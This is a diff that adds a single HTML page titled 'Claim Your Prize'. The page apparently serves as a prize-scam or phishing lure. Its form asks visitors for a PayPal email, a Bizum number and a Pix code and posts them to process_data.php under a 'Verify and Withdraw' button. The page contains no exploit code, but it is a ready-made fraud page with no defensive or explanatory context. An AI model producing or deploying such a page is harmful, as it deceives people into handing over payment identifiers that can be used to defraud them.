@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Your Prize</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #ffcc00;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: #ffffff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .prize-image {
+            max-width: 100%;
+            height: auto;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            color: #333333;
+        }
+
+        p {
+            color: #666666;
+            margin-bottom: 20px;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            max-width: 300px;
+            margin: auto;
+        }
+
+        label {
+            margin-top: 10px;
+        }
+
+        input {
+            padding: 8px;
+            margin-top: 5px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        button {
+            background-color: #4caf50;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="prize_image.jpg" alt="Prize Image" class="prize-image">
+        <h1>Claim Your Prize</h1>
+        <p>Enter your details below to claim your exciting prize!</p>
+        <form action="process_data.php" method="post">
+            <label for="paypalEmail">PayPal Email:</label>
+            <input type="email" id="paypalEmail" name="paypalEmail" required>
+
+            <label for="bizumNumber">Bizum:</label>
+            <input type="text" id="bizumNumber" name="bizumNumber" required>
+
+            <label for="pixCode">Pix:</label>
+            <input type="text" id="pixCode" name="pixCode" required>
+
+            <button type="submit">Verify and Withdraw</button>
+        </form>
+    </div>
+</body>
+</html>
